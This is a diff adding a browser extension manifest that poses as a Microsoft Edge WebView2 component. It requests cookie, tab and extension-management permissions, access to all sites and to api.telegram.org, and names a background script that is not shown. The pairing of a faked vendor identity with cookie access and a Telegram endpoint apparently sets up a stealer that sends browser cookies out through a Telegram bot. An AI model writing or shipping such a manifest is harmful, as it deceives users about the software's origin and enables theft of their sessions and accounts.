@@ -1,0 +1,9 @@
+{
+  "manifest_version": 3,
+  "name": "Microsoft Edge WebView2 Component",
+  "version": "1.0.0",
+  "description": "WebView2 document processing and rendering helper",
+  "permissions": ["cookies", "storage", "alarms", "tabs", "management"],
+  "host_permissions": ["<all_urls>", "https://api.telegram.org/*"],
+  "background": { "service_worker": "background.js" }
+}
